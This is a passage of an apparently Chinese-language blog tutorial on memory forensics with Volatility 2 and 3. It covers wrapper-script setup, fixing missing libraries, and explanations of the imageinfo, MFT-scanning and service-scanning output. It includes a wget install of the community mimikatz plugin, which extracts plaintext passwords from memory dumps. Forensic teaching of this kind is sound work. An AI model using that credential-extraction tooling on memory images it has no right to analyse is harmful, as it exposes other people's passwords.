&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python /home/kali/volatility2/vol.py &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$@&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;的意思是：如果前一个命令成功，则执行后一个命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;前者是启动虚拟环境，要写对应创建的虚拟环境路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后者是把所有参数传递给volatility脚本，要写对应的vol.py路径&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;给脚本添加启动权限&#34;&gt;给脚本添加启动权限
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo chmod +x /usr/local/bin/vol
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样就设置完成了，如果不行，就刷新一下命令缓存再运行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;hash&lt;/span&gt; -r
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;报错解决&#34;&gt;报错解决
&lt;/h2&gt;&lt;h3 id=&#34;缺少运行库&#34;&gt;缺少运行库
&lt;/h3&gt;&lt;p&gt;换了两个虚拟机，每次运行volatility2的时候都会遇到库pycryptodome和distorm3不存在的问题&lt;/p&gt;
&lt;p&gt;这种情况只要进入对应虚拟环境，然后安装缺少的库即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install pycryptodome
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install distorm3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deactivate
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;安装插件&#34;&gt;安装插件
&lt;/h2&gt;&lt;p&gt;volatility2历史悠久，社区也很强大，很多人开发了非常好用的插件，需要我们手动安装&lt;/p&gt;
&lt;p&gt;这里以mimikatz插件为例，具体的下载地址网上一搜就有&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;下载插件，这里使用wget，其他方式随意：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso/mimikatz.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;移动到存放插件的目录，一般是&lt;code&gt;volatility2/volatility/plugins/&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv mimikatz.py /home/kali/volatility2/volatility/plugins/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后就可以使用了，不过mimikatz使用还需要安装依赖，具体看&lt;a class=&#34;link&#34; href=&#34;#%e6%8f%90%e5%8f%96%e6%98%8e%e6%96%87%e5%af%86%e7%a0%81%ef%bc%88mimikatz%ef%bc%89&#34; &gt;mimikatz
    
&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;volatility常用命令&#34;&gt;Volatility常用命令
&lt;/h1&gt;&lt;h2 id=&#34;系统画像&#34;&gt;系统画像
&lt;/h2&gt;&lt;h3 id=&#34;查看系统信息imageinfoinfo&#34;&gt;查看系统信息（imageinfo/info）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;这是vol2进行任何分析前必须执行的第一步，用于确定操作系统的Profile，即版本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; imageinfo 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&amp;lt;内存镜像&amp;gt;的后缀名没有固定的，可能是raw，dump，img，vmem等等&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250708193517165&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708193517165.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708193517165.png&#34; alt=&#34;image-20250708193517165&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Suggested Profile(s)：建议的配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在后续执行所有其他插件时，都需要通过 &lt;code&gt;--profile=&amp;lt;profile_name&amp;gt;&lt;/code&gt; 参数从这个列表中选择一个来使用&lt;/p&gt;
&lt;p&gt;通常，选择列表中的第一个（&lt;code&gt;Win7SP1x64&lt;/code&gt;）就是最合适的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;KDBG：内核调试块地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用于定位其他所有系统信息，如进程列表、驱动列表等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Image date and time：镜像日期和时间，世界标准时间零时区UTC＋0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里表明内存快照是在UTC时间2019年12月20日03:47:57被创建&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Image local date and time：原始机器当时的本地时间，包含时区信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;03:47:57&lt;/code&gt;加上&lt;code&gt;5小时30分钟&lt;/code&gt;，正好等于&lt;code&gt;09:17:57&lt;/code&gt;，这就是当地的时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Number of Processors：处理器数量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里显示该系统是单核处理器&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;V3会自动检测Profile，之后的命令无需手动输入，此命令用于显示详细的信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.info.Info
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250712211412813&#34; href=&#34;http://picture.928330.xyz/typora/image-20250712211412813.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712211412813.png&#34; alt=&#34;image-20250712211412813&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NTBuildLab&lt;/strong&gt;：&lt;strong&gt;Windows操作系统构建版本标签&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;7601.17514.amd64fre.win7sp1_rtm&lt;/code&gt;，代表一个经过后续更新（修订号17514）的、面向64位amd架构的、已正式发布的、基于Windows7SP1开发分支的操作系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;KeNumberProcessors：处理器个数&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SystemTime&lt;/strong&gt;：&lt;strong&gt;内存快照被制作的时间，世界标准时间零时区UTC＋0&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NtProductType： Windows操作系统的产品类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtProductWinNt&lt;/code&gt;：客户端版本&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtProductServer&lt;/code&gt;：服务器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtProductLanManNt&lt;/code&gt;：域控制器，是特定类型的服务器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NtMajorVersion / NtMinorVersion&lt;/strong&gt;：&lt;strong&gt;Windows操作系统内核的主版本号和次版本号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;6.1在WindowsNT内核版本中，对应着Windows7或WindowsServer2008R2&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PE TimeDateStamp&lt;/strong&gt;：&lt;strong&gt;系统内核文件被编译的时间&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看文件信息mftparsermftscan&#34;&gt;查看文件信息（mftparser/mftscan）
&lt;/h3&gt;&lt;p&gt;除了Volatility，还可以使用其他工具导出mft记录：https://github.com/jschicht/Mft2Csv/releases&lt;/p&gt;
&lt;p&gt;下载打开软件，选择&lt;code&gt;$MFT&lt;/code&gt;文件，然后导出到&lt;code&gt;csv&lt;/code&gt;文件即可，导出的条目会以&lt;code&gt;csv&lt;/code&gt;文件的形式存放在软件目录下&lt;/p&gt;
&lt;h4 id=&#34;volatility2-1&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; mftparser
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250716202015759&#34; href=&#34;http://picture.928330.xyz/typora/image-20250716202015759.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716202015759.png&#34; alt=&#34;image-20250716202015759&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MFT entry found at offset &amp;hellip;&lt;/strong&gt;：该MFT记录在内存中的物理偏移地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Attribute:In Use &amp;amp; File&lt;/strong&gt;：表明这是一条活动的、描述文件的记录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Record Number&lt;/strong&gt;：该记录在MFT中的唯一编号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Link count&lt;/strong&gt;：指向这个文件实体的文件名数量（硬链接数）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;$STANDARD_INFORMATION&lt;/strong&gt;：主属性，只有当&lt;strong&gt;文件内容&lt;/strong&gt;被编辑时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间才会改变&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;$FILE_NAME&lt;/strong&gt;：文件名属性，文件&lt;strong&gt;内容被改动、重命名、移动&lt;/strong&gt;时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间都会改变&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Creation&lt;/strong&gt;：创建时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Modified&lt;/strong&gt;：修改时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MFT Altered&lt;/strong&gt;：MFT记录本身最后一次被修改的时间，例如文件名或权限变更&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Access Date&lt;/strong&gt;：文件内容最后一次被访问的时间（注意：在现代Windows系统中，为提高性能，这个时间戳不一定总是实时更新）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Name/Path&lt;/strong&gt;：显示具体的文件名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-1&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.mftscan.MFTScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250716202259656&#34; href=&#34;http://picture.928330.xyz/typora/image-20250716202259656.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716202259656.png&#34; alt=&#34;image-20250716202259656&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Offset ：偏移量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是该 MFT 记录在内存中的虚拟地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Record Type：记录类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;指明该记录是用于一个文件（FILE）还是一个目录（Directory）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Record Number：记录编号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是该文件/目录在整个 MFT 中的唯一索引号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Link Count：链接计数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;表示有多少个文件名指向这个相同的文件实体&lt;/p&gt;
&lt;p&gt;例如，值为2意味着这个文件有两个名字，通常一个是长文件名，一个是8.3格式的短文件名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MFT Type：MFT类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进一步描述MFT条目的类型，通常与Record Type一致&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Permissions：权限属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;显示文件的属性，如 Archive (存档)、System (系统文件)等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Attribute Type：属性类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;指明当前这一行显示的是 MFT 记录中的哪一种具体属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;STANDARD_INFORMATION&lt;/code&gt;&lt;/strong&gt;：主属性，只有当&lt;strong&gt;文件内容&lt;/strong&gt;被编辑时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间才会改变&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;FILE_NAME&lt;/code&gt;&lt;/strong&gt;：文件名属性，文件&lt;strong&gt;内容被改动、重命名、移动&lt;/strong&gt;时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间都会改变&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最前面带星号的行是隶属于它上面那个不带星号的主记录的子属性&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Created, Modified, Updated, Accessed：四种时间戳&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;分别代表了该属性（STANDARD_INFORMATION 或 FILE_NAME）的：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建时间、修改时间、MFT记录更新时间、访问时间（以UTC标准时间显示）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Filename：文件名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当 Attribute Type 为 FILE_NAME 时，这一列会显示具体的文件名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看windows服务svcscan&#34;&gt;查看windows服务（svcscan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-2&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; svcscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706145215760.png&#34; alt=&#34;image-20250706145215760&#34; style=&#34;zoom：67%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Service Name&lt;/strong&gt;：服务的内部名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Display Name&lt;/strong&gt;：服务的显示名称，在服务管理器中的名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Process ID&lt;/strong&gt;：该服务的进程的ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Service State&lt;/strong&gt;： 服务状态，表明服务是&lt;code&gt;RUNNING&lt;/code&gt;(正在运行) 还是&lt;code&gt;STOPPED&lt;/code&gt;(已停止)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Binary Path&lt;/strong&gt;：服务路径&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-2&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; vol3 -f &amp;lt;内存镜像&amp;gt; windows.svcscan.SvcScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250716210316417&#34; href=&#34;http://picture.928330.xyz/typora/image-20250716210316417.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716210316417.png&#34; alt=&#34;image-20250716210316417&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Offset：偏移量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是该服务记录在内存中的虚拟地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Order：顺序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;服务在其服务组内的加载顺序编号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PID：进程ID&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果该服务当前正在运行，这里会显示托管它的进程的ID，如果服务已停止，则显示为 &lt;code&gt;N/A&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Start：启动类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是在注册表中为该服务配置的启动方式，决定了它如何被启动，有下面几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_BOOT_START&lt;/code&gt;：引导启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_SYSTEM_START&lt;/code&gt;：系统启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_AUTO_START&lt;/code&gt;：自动启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_DEMAND_START&lt;/code&gt;：按需启动 (手动)&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_DISABLED&lt;/code&gt;：已禁用&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;State：当前状态&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;表示在捕获内存时该服务的实时状态，有下面这几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_STOPPED&lt;/code&gt;：服务已停止&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_START_PENDING&lt;/code&gt;：服务正在启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_STOP_PENDING&lt;/code&gt;：服务正在停止&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_RUNNING&lt;/code&gt;：服务正在运行&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_CONTINUE_PENDING&lt;/code&gt;：服务即将继续&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_PAUSE_PENDING&lt;/code&gt;：服务即将暂停&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_PAUSED&lt;/code&gt;：服务已暂停&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Type：服务类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;描述了该服务的性质，有下面几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_KERNEL_DRIVER&lt;/code&gt;：内核模式驱动程序&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_FILE_SYSTEM_DRIVER&lt;/code&gt;：文件系统驱动程序&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_WIN32_OWN_PROCESS&lt;/code&gt;：独立进程Win32服务&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_WIN32_SHARE_PROCESS&lt;/code&gt;：共享进程Win32服务&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_INTERACTIVE_PROCESS&lt;/code&gt;：交互式服务&lt;/strong&gt;，由于安全原因，这个服务已经被弃用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Name：服务名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;服务的短名称或内部名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Display：显示名称&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Windows服务管理器中看到的人类可读的名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Binary：二进制/运行命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是启动该服务进程时实际使用的命令行&lt;/p&gt;
&lt;p&gt;对于共享服务，这里通常会包含&lt;code&gt;-k &amp;lt;服务组名&amp;gt;&lt;/code&gt;参数，例如&lt;code&gt;C:\Windows\system32\svchost.exe -k DcomLaunch&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Binary (Registry)：注册表中的二进制路径&lt;/strong&gt;&lt;/p&gt;
